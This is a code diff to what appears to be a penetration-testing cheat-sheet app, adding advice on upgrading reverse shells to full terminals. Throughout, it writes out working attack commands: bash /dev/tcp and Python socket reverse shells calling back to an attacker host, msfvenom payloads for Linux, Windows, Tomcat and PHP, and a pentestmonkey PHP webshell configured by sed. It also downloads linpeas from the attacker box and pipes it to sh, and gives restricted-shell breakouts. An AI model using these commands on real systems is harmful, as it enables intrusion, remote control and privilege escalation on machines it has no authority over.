@@ -698,7 +698,7 @@ const TRACKS=[
    {d:"Start your listener",c:"rlwrap nc -lvnp {LPORT}",l:"Running before you fire the payload."},
    {d:"Reverse shell (grab the right one from revshells.com)",c:"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
     l:"If bash is filtered, use the python, nc-mkfifo or perl variant."},
-   {d:"Upgrade the TTY \u2014 1. on the TARGET, spawn a PTY (no python3? use  script -qc /bin/bash /dev/null )",c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+   {d:"Upgrade the TTY \u2014 1. on the TARGET, spawn a PTY \u2014 fallback chain in the command",c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# no python3? try:  python -c 'import pty; pty.spawn(\"/bin/bash\")'\n# neither installed? fall back to:  script -qc /bin/bash /dev/null",
     l:"<b>Do this first, a raw shell dies on the first Ctrl-C.</b>"},
    {d:"2. Press Ctrl-Z to background it \u2014 lands you back on your own Kali prompt",c:"# keypress, no command: just hit  Ctrl-Z"},
    {d:"3. On your LOCAL Kali box. Paste both lines together \u2014 screen goes blank/no-echo, that's normal, press Enter",c:"stty raw -echo\nfg"},
@@ -706,7 +706,7 @@ const TRACKS=[
    {d:"5. Size it: run  stty size  in a spare Kali tab to get 'rows cols', then set them on the TARGET",c:"stty rows 38 cols 190"},
    {d:"Landed in a restricted shell (rbash/rksh)? break out",c:"ssh {USER}@{IP} -t bash --noprofile --norc   # ask for bash at login\n# already in: vi -> :set shell=/bin/sh :shell   |   or  python3 -c 'import os;os.system(\"/bin/bash\")'\n# PATH/builtins limited: export PATH=/bin:/usr/bin; /bin/bash",
     l:"A restricted shell blocks cd, /, and PATH changes. Request <code>bash</code> at SSH login, or break out through any program that spawns a shell (vi, less, awk, find, man \u2014 GTFOBins lists them)."}
- ],tips:["Host files with <code>python3 -m http.server 80</code>, pull with wget or curl.","Keep the listener in its own tmux pane."]},
+ ],tips:["Host files with <code>python3 -m http.server 80</code>, pull with wget or curl.","Keep the listener in its own tmux pane.","<b>Shell won't upgrade?</b> If <code>pty.spawn</code> does nothing and Ctrl-Z hangs, you are on a <i>command-runner</i> payload (e.g. <code>msfvenom php/reverse_php</code>), not a real interactive shell \u2014 there is no shell process to attach a PTY to. Use pentestmonkey's <code>php-reverse-shell.php</code> (it spawns <code>/bin/sh -i</code>), or from the dead shell fire a fresh bash/python reverse shell to a second listener and upgrade <i>that</i>."]},
  {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",steps:[
    {d:"Check sudo rights first, the fastest win",c:"sudo -l",l:"Anything listed almost certainly has an exact escalation on <b>GTFOBins</b>."},
    {d:"Get linpeas onto the box, then actually read it",c:"# on YOUR box, in the folder holding linpeas.sh:\npython3 -m http.server 4444\n# on the TARGET:\nwget http://{LHOST}:4444/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.txt\n# no wget? curl -s http://{LHOST}:4444/linpeas.sh | sh\n# nothing writable but /dev/shm? cd /dev/shm first",l:"Serve and fetch on the <b>same</b> port — that is the mistake people make here. 4444 is fine for the transfer, but it is also the default listener port, so if you are catching a shell on it serve on 80 or 8000 instead. Pipe it straight to <code>sh</code> when you cannot write to disk, at the cost of not keeping the output. Then read it: the red and yellow highlights are the whole point, and scrolling past them is how a box takes an extra hour."},
@@ -1069,7 +1069,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.7.1";
+const APP_VERSION="1.7.2";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
@@ -1771,9 +1771,13 @@ function renderShells(){
       {d:"Linux ELF",c:"msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o rev.elf"},
       {d:"Windows EXE",c:"msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o rev.exe"},
       {d:"WAR for Tomcat",c:"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o rev.war"},
-      {d:"PHP",c:"msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o rev.php"}]},
+      {d:"PHP (command-runner webshell \u2014 will NOT upgrade to a TTY)",c:"msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o rev.php"}]},
+    {title:"PHP: get an UPGRADEABLE shell",goal:"php/reverse_php just runs one command at a time \u2014 pty.spawn does nothing on it. These give a real interactive /bin/sh you can upgrade",items:[
+      {d:"pentestmonkey php-reverse-shell.php \u2014 spawns /bin/sh -i, upgrades cleanly",c:"cp /usr/share/webshells/php/php-reverse-shell.php shell.php && sed -i 's/127.0.0.1/{LHOST}/; s/1234/{LPORT}/' shell.php"},
+      {d:"Or from the webshell/RCE, fire bash straight at your listener (skip the PHP payload entirely)",c:"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"},
+      {d:"Stuck in a command-runner shell? pivot: run this to a SECOND listener, then upgrade that one",c:"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"}]},
     {title:"Upgrade to a full TTY",goal:"each line says where it runs \u2014 target or your Kali box",items:[
-      {d:"1. On the TARGET: spawn a PTY (no python3? try  script -qc /bin/bash /dev/null )",c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"},
+      {d:"1. On the TARGET: spawn a PTY \u2014 the fallback chain is in the command",c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# no python3? try:  python -c 'import pty; pty.spawn(\"/bin/bash\")'\n# neither installed? fall back to:  script -qc /bin/bash /dev/null"},
       {d:"2. Press Ctrl-Z to background it \u2014 this drops you back to your own Kali prompt",c:"# keypress, no command: just hit  Ctrl-Z"},
       {d:"3. On your LOCAL Kali box. Paste both lines together \u2014 the screen goes blank/no-echo, that's normal, press Enter",c:"stty raw -echo\nfg"},
       {d:"4. Back on the TARGET: fix the environment",c:"export TERM=xterm\nexport SHELL=/bin/bash"},
